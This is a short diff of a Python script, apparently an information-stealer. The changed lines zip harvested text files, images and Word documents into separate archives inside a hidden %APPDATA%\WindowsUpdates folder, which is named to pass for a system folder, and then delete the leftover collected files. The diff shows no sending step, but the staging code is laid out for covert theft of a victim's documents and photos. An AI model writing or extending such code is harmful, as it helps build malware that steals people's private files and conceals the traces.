@@ -54,6 +54,8 @@ def remove_remnants(path):
             os.remove(os.path.join(root, file))
 
 main()
-make_archive(f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files", 'zip', f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files")
+make_archive(rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\txt", 'zip', rf"{os.getenv('APPDATA')}\WindowsUpdates\txt")
+make_archive(rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\images", 'zip', rf"{os.getenv('APPDATA')}\WindowsUpdates\images")
+make_archive(rf"{os.getenv('APPDATA')}\WindowsUpdates\collected_files\docx", 'zip', rf"{os.getenv('APPDATA')}\WindowsUpdates\docx")
 
 remove_remnants(f"{os.getenv('APPDATA')}\WindowsUpdates\collected_files")
